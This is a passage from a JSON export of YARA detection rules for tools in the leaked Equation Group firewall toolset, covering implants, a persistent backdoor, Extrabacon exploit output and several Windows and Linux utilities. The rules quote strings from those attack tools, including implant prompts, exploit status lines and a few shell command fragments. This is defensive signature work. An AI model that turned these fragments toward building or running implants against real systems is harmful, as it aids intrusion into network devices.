fullword ascii\n      $s2 = \"%s/BF_%04d%02d%02d.log\" fullword ascii\n      $s3 = \"%s/BF_READ_%08x_%04d%02d%02d_%02d%02d%02d.bin\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and 1 of ( $x* ) ) or ( all of them )\n}","date":"2016-08-16 11:45:21","description":"EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, writeJetPlow-2130","minimum_yara":"1.7","name":"APT_EQGRP_Implants_Gen5_RID2F29","reference":"Research","required_modules":[],"rule_hash":"4aa479e184f933d8cb4dad20d1a38ef2","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_pandarock_RID2DE6 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files pandarock_v1.11.1.1.bin, pit\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:51:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"* Not attempting to execute \\\"%s\\\" command\" fullword ascii\n      $x2 = \"TERMINATING SCRIPT (command error or \\\"quit\\\" encountered)\" fullword ascii\n      $x3 = \"execute code in <file> passing <argX> (HEX)\" fullword ascii\n      $x4 = \"* Use arrow keys to scroll through command history\" fullword ascii\n      $s1 = \"pitCmd_processCmdLine\" fullword ascii\n      $s2 = \"execute all commands in <file>\" fullword ascii\n      $s3 = \"__processShellCmd\" fullword ascii\n      $s4 = \"pitTarget_getDstPort\" fullword ascii\n      $s5 = \"__processSetTargetIp\" fullword ascii\n      $o1 = \"Logging commands and output - ON\" fullword ascii\n      $o2 = \"This command is too dangerous.  If you'd like to run it, contact the development team\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 1 of ( $x* ) ) or ( 4 of them ) or 1 of ( $o* )\n}","date":"2016-08-16 10:51:31","description":"EQGRP Toolset Firewall - from files pandarock_v1.11.1.1.bin, pit","minimum_yara":"1.7","name":"APT_EQGRP_pandarock_RID2DE6","reference":"Research","required_modules":[],"rule_hash":"9f219785ef69da5d69946d5cc8598a2c","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BananaUsurper_writeJetPlow_RID34B9 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, writeJetPlow-2130\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 15:42:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Implant Version-Specific Values:\" fullword ascii\n      $x2 = \"This function should not be used with a Netscreen, something has gone horribly wrong\" fullword ascii\n      $s1 = \"createSendRecv: recv'd an error from the target.\" fullword ascii\n      $s2 = \"Error: WatchDogTimeout read returned %d instead of 4\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of ( $x* ) ) or ( 3 of them )\n}","date":"2016-08-16 15:42:41","description":"EQGRP Toolset Firewall - from files BananaUsurper-2120, writeJetPlow-2130","minimum_yara":"1.7","name":"APT_EQGRP_BananaUsurper_writeJetPlow_RID34B9","reference":"Research","required_modules":[],"rule_hash":"1ecb55168ddd3eccea357b97c48c6f43","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_Implants_Gen4_RID2F28 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:45:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Command has not yet been coded\" fullword ascii\n      $s2 = \"Beacon Domain  : www.%s.com\" fullword ascii\n      $s3 = \"This command can only be run on a PIX/ASA\" fullword ascii\n      $s4 = \"Warning! Bad or missing Flash values (in section 2 of .dat file)\" fullword ascii\n      $s5 = \"Printing the interface info and security levels. PIX ONLY.\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 3 of them ) or ( all of them )\n}","date":"2016-08-16 11:45:11","description":"EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120","minimum_yara":"1.7","name":"APT_EQGRP_Implants_Gen4_RID2F28","reference":"Research","required_modules":[],"rule_hash":"14e9c9bada21f8d6fe7c231038779bda","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_Implants_Gen3_RID2F27 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"incomplete and must be removed manually.)\" fullword ascii\n      $s1 = \"%s: recv'd an error from the target.\" fullword ascii\n      $s2 = \"Unable to fetch the address to the get_uptime_secs function for this OS version\" fullword ascii\n      $s3 = \"upload/activate/de-activate/remove/cmd function failed\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and 2 of them ) or ( all of them )\n}","date":"2016-08-16 11:45:01","description":"EQGRP Toolset Firewall - from files BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100","minimum_yara":"1.7","name":"APT_EQGRP_Implants_Gen3_RID2F27","reference":"Research","required_modules":[],"rule_hash":"d40aa3e5d8e87cf6a6c0d865ba9f4d57","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_BLIAR_BLIQUER_RID2E10 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:58:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Do you wish to activate the implant that is already on the firewall? (y/n): \" fullword ascii\n      $x2 = \"There is no implant present on the firewall.\" fullword ascii\n      $x3 = \"Implant Version :%lx%lx%lx\" fullword ascii\n      $x4 = \"You may now connect to the implant using the pbd idkey\" fullword ascii\n      $x5 = \"No reply from persistant back door.\" fullword ascii\n      $x6 = \"rm -rf pbd.wc; wc -c %s > pbd.wc\" fullword ascii\n      $p1 = \"PBD_GetVersion\" fullword ascii\n      $p2 = \"pbd/pbdEncrypt.bin\" fullword ascii\n      $p3 = \"pbd/pbdGetVersion.pkt\" fullword ascii\n      $p4 = \"pbd/pbdStartWrite.bin\" fullword ascii\n      $p5 = \"pbd/pbd_setNewHookPt.pkt\" fullword ascii\n      $p6 = \"pbd/pbd_Upload_SinglePkt.pkt\" fullword ascii\n      $s1 = \"Unable to fetch hook and jmp addresses for this OS version\" fullword ascii\n      $s2 = \"Could not get hook and jump addresses\" fullword ascii\n      $s3 = \"Enter the name of a clean implant binary (NOT an image):\" fullword ascii\n      $s4 = \"Unable to read dat file for OS version 0x%08lx\" fullword ascii\n      $s5 = \"Invalid implant file\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and ( 1 of ( $x* ) or 1 of ( $p* ) ) ) or ( 3 of them )\n}","date":"2016-08-16 10:58:31","description":"EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230","minimum_yara":"1.7","name":"APT_EQGRP_BLIAR_BLIQUER_RID2E10","reference":"Research","required_modules":[],"rule_hash":"a7bf69ed4d7a0ce38e1d38fc7d976b6f","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_sploit_RID2CCE : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files sploit.py, sploit.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 10:04:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"print \\\"[+] Connecting to %s:%s\\\" % (self.params.dst['ip'], self.params.dst['port'])\" fullword ascii\n      $s2 = \"@overridable(\\\"Must be overriden if the target will be touched.  Base implementation should not be called.\\\")\" fullword ascii\n      $s3 = \"@overridable(\\\"Must be overriden.  Base implementation should not be called.\\\")\" fullword ascii\n      $s4 = \"exp.load_vinfo()\" fullword ascii\n      $s5 = \"if not okay and self.terminateFlingOnException:\" fullword ascii\n      $s6 = \"print \\\"[-] keyboard interrupt before response received\\\"\" fullword ascii\n      $s7 = \"if self.terminateFlingOnException:\" fullword ascii\n      $s8 = \"print 'Debug info ','='*40\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x2123 and filesize < 90KB and 1 of ( $s* ) ) or ( 4 of them )\n}","date":"2016-08-16 10:04:51","description":"EQGRP Toolset Firewall - from files sploit.py, sploit.py","minimum_yara":"1.7","name":"APT_EQGRP_sploit_RID2CCE","reference":"Research","required_modules":[],"rule_hash":"14faa51b9a7825311f23230571632abd","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_Implants_Gen2_RID2F26 : APT DEMO FILE T1083 {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, writeJetPlow-2130\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:44:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE, T1083\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Modules persistence file written successfully\" fullword ascii\n      $x2 = \"Modules persistence data successfully removed\" fullword ascii\n      $x3 = \"No Modules are active on the firewall, nothing to persist\" fullword ascii\n      $s1 = \"--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s \" fullword ascii\n      $s2 = \"Error while attemping to persist modules:\" fullword ascii\n      $s3 = \"Error while reading interface info from PIX\" fullword ascii\n      $s4 = \"LP.c:pixFree - Failed to get response\" fullword ascii\n      $s5 = \"WARNING: LP Timeout specified (%lu seconds) less than default (%u seconds).  Setting default\" fullword ascii\n      $s6 = \"Unable to fetch config address for this OS version\" fullword ascii\n      $s7 = \"LP.c: interface information not available for this session\" fullword ascii\n      $s8 = \"[%s:%s:%d] ERROR: \" fullword ascii\n      $s9 = \"extract_fgbg\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 3000KB and 1 of ( $x* ) ) or ( 5 of them )\n}","date":"2016-08-16 11:44:51","description":"EQGRP Toolset Firewall - from files BananaUsurper-2120, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, writeJetPlow-2130","minimum_yara":"1.7","name":"APT_EQGRP_Implants_Gen2_RID2F26","reference":"Research","required_modules":[],"rule_hash":"9e81c11386ca1c7e6fcfa1cf4f935860","score":75,"tags":["APT","DEMO","T1083","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_Implants_Gen1_RID2F25 : APT DEMO FILE {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, lpexe, writeJetPlow-2130\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:44:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"WARNING:  Session may not have been closed!\" fullword ascii\n      $s2 = \"EXEC Packet Processed\" fullword ascii\n      $s3 = \"Failed to insert the command into command list.\" fullword ascii\n      $s4 = \"Send_Packet: Trying to send too much data.\" fullword ascii\n      $s5 = \"payloadLength >= MAX_ALLOW_SIZE.\" fullword ascii\n      $s6 = \"Wrong Payload Size\" fullword ascii\n      $s7 = \"Unknown packet received......\" fullword ascii\n      $s8 = \"Returned eax = %08x\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 6000KB and ( 2 of ( $s* ) ) ) or ( 5 of them )\n}","date":"2016-08-16 11:44:41","description":"EQGRP Toolset Firewall - from files BananaUsurper-2120, BARPUNCH-3110, BLIAR-2110, BLIQUER-2230, BLIQUER-3030, BLIQUER-3120, BPICKER-3100, lpexe, writeJetPlow-2130","minimum_yara":"1.7","name":"APT_EQGRP_Implants_Gen1_RID2F25","reference":"Research","required_modules":[],"rule_hash":"75bd3ae3ea69b6241f986183ff8896c1","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_eligiblebombshell_generic_RID3464 : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files eligiblebombshell_1.2.0.1.py, eligiblebombshell_1.2.0.1.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 15:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"logging.error(\\\"       Perhaps you should run with --scan?\\\")\" fullword ascii\n      $s2 = \"logging.error(\\\"ERROR: No entry for ETag [%s] in %s.\\\" %\" fullword ascii\n      $s3 = \"\\\"be supplied\\\")\" fullword ascii\n   condition: \n      ( filesize < 70KB and 2 of ( $s* ) ) or ( all of them )\n}","date":"2016-08-16 15:28:31","description":"EQGRP Toolset Firewall - from files eligiblebombshell_1.2.0.1.py, eligiblebombshell_1.2.0.1.py","minimum_yara":"1.7","name":"APT_EQGRP_eligiblebombshell_generic_RID3464","reference":"Research","required_modules":[],"rule_hash":"8c33e5cc0110299bfa280e9aff62071d","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_ssh_telnet_29_RID2F36 : APT DEMO T1021 {\n   meta:\n      description = \"EQGRP Toolset Firewall - from files ssh.py, telnet.py\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 11:47:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"received prompt, we're in\" fullword ascii\n      $s2 = \"failed to login, bad creds, abort\" fullword ascii\n      $s3 = \"sending command \\\" + str(n) + \\\"/\\\" + str(tot) + \\\", len \\\" + str(len(chunk) + \" fullword ascii\n      $s4 = \"received nat - EPBA: ok, payload: mangled, did not run\" fullword ascii\n      $s5 = \"no status returned from target, could be an exploit failure, or this is a version where we don't expect a stus return\" ascii\n      $s6 = \"received arp - EPBA: ok, payload: fail\" fullword ascii\n      $s7 = \"chopped = string.rstrip(payload, \\\"\\\\x0a\\\")\" fullword ascii\n   condition: \n      ( filesize < 10KB and 2 of them ) or ( 3 of them )\n}","date":"2016-08-16 11:47:31","description":"EQGRP Toolset Firewall - from files ssh.py, telnet.py","minimum_yara":"1.7","name":"APT_EQGRP_ssh_telnet_29_RID2F36","reference":"Research","required_modules":[],"rule_hash":"6630ce60a4d71641f638818614caec6d","score":75,"tags":["APT","DEMO","T1021"]},{"author":"Florian Roth","content":"rule APT_EQGRP_Extrabacon_Output_RID312A : APT DEMO {\n   meta:\n      description = \"EQGRP Toolset Firewall - Extrabacon exploit output\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-16 13:10:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"|###[ SNMPresponse ]###\" fullword ascii\n      $s2 = \"[+] generating exploit for exec mode pass-disable\" fullword ascii\n      $s3 = \"[+] building payload for mode pass-disable\" fullword ascii\n      $s4 = \"[+] Executing:  extrabacon\" fullword ascii\n      $s5 = \"appended AAAADMINAUTH_ENABLE payload\" fullword ascii\n   condition: \n      2 of them\n}","date":"2016-08-16 13:10:51","description":"EQGRP Toolset Firewall - Extrabacon exploit output","minimum_yara":"1.7","name":"APT_EQGRP_Extrabacon_Output_RID312A","reference":"Research","required_modules":[],"rule_hash":"1a6483adc2dbc283120ccb518119d749","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_morel_RID2C52 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file morel.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 09:44:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%d - %d, %d\" fullword ascii\n      $s2 = \"%d - %lu.%lu %d.%lu\" fullword ascii\n      $s3 = \"%d - %d %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 60KB and all of them )\n}","date":"2016-08-15 09:44:11","description":"Detects tool from EQGRP toolset - file morel.exe","minimum_yara":"1.7","name":"APT_EQGRP_morel_RID2C52","reference":"Research","required_modules":[],"rule_hash":"67eecc3f25eef7efe54081fbed28a4c0","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_bc_parser_RID2DE4 : APT DEMO FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file bc-parser\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 10:51:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"*** Target may be susceptible to FALSEMOREL      ***\" fullword ascii\n      $s2 = \"*** Target is susceptible to FALSEMOREL          ***\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x457f and 1 of them\n}","date":"2016-08-15 10:51:11","description":"Detects tool from EQGRP toolset - file bc-parser","minimum_yara":"1.7","name":"APT_EQGRP_bc_parser_RID2DE4","reference":"Research","required_modules":[],"rule_hash":"82acaef9436942eae235375f0889a971","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_noclient_3_0_5_RID2F44 : APT DEMO FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file noclient-3.0.5.3\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 11:49:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"-C %s 127.0.0.1\\\" scripme -F -t JACKPOPIN4 '&\" fullword ascii\n      $x2 = \"Command too long!  What the HELL are you trying to do to me?!?!  Try one smaller than %d bozo.\" fullword ascii\n      $x3 = \"sh -c \\\"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \\\"\" fullword ascii\n      $x4 = \"Error from ourtn, did not find keys=target in tn.spayed\" fullword ascii\n      $x5 = \"ourtn -d -D %s -W 127.0.0.1:%d  -i %s -p %d %s %s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and 1 of them ) or ( all of them )\n}","date":"2016-08-15 11:49:51","description":"Detects tool from EQGRP toolset - file noclient-3.0.5.3","minimum_yara":"1.7","name":"APT_EQGRP_noclient_3_0_5_RID2F44","reference":"Research","required_modules":[],"rule_hash":"28a7849171571982c700e7e74512b48c","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_installdate_RID2EC8 : APT DEMO {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file installdate.pl\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 11:29:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"#Provide hex or EP log as command-line argument or as input\" fullword ascii\n      $x2 = \"print \\\"Gimme hex: \\\";\" fullword ascii\n      $x3 = \"if ($line =~ /Reg_Dword:  (\\\\d\\\\d:\\\\d\\\\d:\\\\d\\\\d.\\\\d+ \\\\d+ - )?(\\\\S*)/) {\" fullword ascii\n      $s1 = \"if ($_ =~ /InstallDate/) {\" fullword ascii\n      $s2 = \"if (not($cmdInput)) {\" fullword ascii\n      $s3 = \"print \\\"$hex in decimal=$dec\\\\n\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 2KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2016-08-15 11:29:11","description":"Detects tool from EQGRP toolset - file installdate.pl","minimum_yara":"1.7","name":"APT_EQGRP_installdate_RID2EC8","reference":"Research","required_modules":[],"rule_hash":"c537182739153ad9b88acaf20be76ca4","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule APT_EQGRP_teflondoor_RID2E6F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file teflondoor.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 11:14:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s: abort.  Code is %d.  Message is '%s'\" fullword ascii\n      $x2 = \"%s: %li b (%li%%)\" fullword ascii\n      $s1 = \"no winsock\" fullword ascii\n      $s2 = \"%s: %s file '%s'\" fullword ascii\n      $s3 = \"peer: connect\" fullword ascii\n      $s4 = \"read: write\" fullword ascii\n      $s5 = \"%s: done!\" fullword ascii\n      $s6 = \"%s: %li b\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and 1 of ( $x* ) and 3 of them\n}","date":"2016-08-15 11:14:21","description":"Detects tool from EQGRP toolset - file teflondoor.exe","minimum_yara":"1.7","name":"APT_EQGRP_teflondoor_RID2E6F","reference":"Research","required_modules":[],"rule_hash":"6ff5825dd6b1b225f60f3e131a1947e5","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_durablenapkin_solaris_2_0_1_RID349F : APT DEMO FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file durablenapkin.solaris.2.0.1.1\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 15:38:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"recv_ack: %s: Service not supplied by provider\" fullword ascii\n      $s2 = \"send_request: putmsg \\\"%s\\\": %s\" fullword ascii\n      $s3 = \"port undefined\" fullword ascii\n      $s4 = \"recv_ack: %s getmsg: %s\" fullword ascii\n      $s5 = \">> %d -- %d\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 2 of them )\n}","date":"2016-08-15 15:38:21","description":"Detects tool from EQGRP toolset - file durablenapkin.solaris.2.0.1.1","minimum_yara":"1.7","name":"APT_EQGRP_durablenapkin_solaris_2_0_1_RID349F","reference":"Research","required_modules":[],"rule_hash":"11eca751993ecf7a56917767fafba597","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_teflonhandle_RID2F27 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file teflonhandle.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 11:45:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%s [infile] [outfile] /k 0x[%i character hex key] </g>\" fullword ascii\n      $s2 = \"File %s already exists.  Overwrite? (y/n) \" fullword ascii\n      $s3 = \"Random Key : 0x\" fullword ascii\n      $s4 = \"done (%i bytes written).\" fullword ascii\n      $s5 = \"%s --> %s...\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 20KB and 2 of them\n}","date":"2016-08-15 11:45:01","description":"Detects tool from EQGRP toolset - file teflonhandle.exe","minimum_yara":"1.7","name":"APT_EQGRP_teflonhandle_RID2F27","reference":"Research","required_modules":[],"rule_hash":"e2d3f7a6f37f35eb02c5eaefe137b018","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_false_RID2C3E : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file false.exe\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 09:40:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n         00 25 6C 75 2E 25 6C 75 2E 25 6C 75 2E 25 6C 75\n         00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n         00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00\n         00 25 32 2E 32 58 20 00 00 0A 00 00 00 25 64 20\n         2D 20 25 64 20 25 64 0A 00 25 64 0A 00 25 64 2E\n         0A 00 00 00 00 25 64 2E 0A 00 00 00 00 25 64 2E\n         0A 00 00 00 00 25 64 20 2D 20 25 64 0A 00 00 00\n         00 25 64 20 2D 20 25 64 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and $s1\n}","date":"2016-08-15 09:40:51","description":"Detects tool from EQGRP toolset - file false.exe","minimum_yara":"1.7","name":"APT_EQGRP_false_RID2C3E","reference":"Research","required_modules":[],"rule_hash":"d46b5d5ba85dcaae28d2e05e813a0cb2","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_dn_1_0_2_1_RID2D45 : APT DEMO FILE {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file dn.1.0.2.1.linux\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 10:24:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Valid commands are: SMAC, DMAC, INT, PACK, DONE, GO\" fullword ascii\n      $s2 = \"invalid format suggest DMAC=00:00:00:00:00:00\" fullword ascii\n      $s3 = \"SMAC=%02x:%02x:%02x:%02x:%02x:%02x\" fullword ascii\n      $s4 = \"Not everything is set yet\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 2 of them )\n}","date":"2016-08-15 10:24:41","description":"Detects tool from EQGRP toolset - file dn.1.0.2.1.linux","minimum_yara":"1.7","name":"APT_EQGRP_dn_1_0_2_1_RID2D45","reference":"Research","required_modules":[],"rule_hash":"bfface3706e55e7e9fd04ac768904589","score":75,"tags":["APT","DEMO","FILE"]},{"author":"Florian Roth","content":"rule APT_EQGRP_1212_RID2AF9 : APT DEMO {\n   meta:\n      description = \"Detects tool from EQGRP toolset - file 1212.pl\"\n      author = \"Florian Roth\"\n      reference = \"Research\"\n      date = \"2016-08-15 08:46:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if (!(($srcip,$dstip,$srcport,$dstport) = ($line=~/^([a-f0-9]{8})([a-f0-9]{8})([a-f0-9]{4})([a-f0-9]{4})$/)))\" fullword ascii\n      $s2 = 